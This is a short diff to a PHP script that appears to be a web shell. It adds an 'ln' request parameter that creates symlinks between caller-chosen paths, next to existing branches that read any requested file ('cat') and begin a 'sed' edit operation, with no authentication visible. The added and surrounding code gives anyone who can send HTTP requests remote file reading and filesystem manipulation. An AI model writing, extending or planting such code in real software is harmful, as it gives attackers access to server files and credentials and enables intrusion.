@@ -111,6 +111,12 @@
     } elseif (isset($_REQUEST['cat'])) {
         $file = $_REQUEST['cat'];
         $contents .= file_get_contents($file);
+    } elseif (isset($_REQUEST['ln'])) {
+        $file = $_REQUEST['ln'];
+        if (!isset($_REQUEST['to'])) {
+            die("Parameter 'to' missing.");
+        }
+        $contents .= symlink($file, $_REQUEST['to']) ? "success" : "fail";  // 0 is false and success
     } elseif (isset($_REQUEST['sed'])) {
         if (isset($_REQUEST['l0'])) {
             $file = $_REQUEST['sed'];
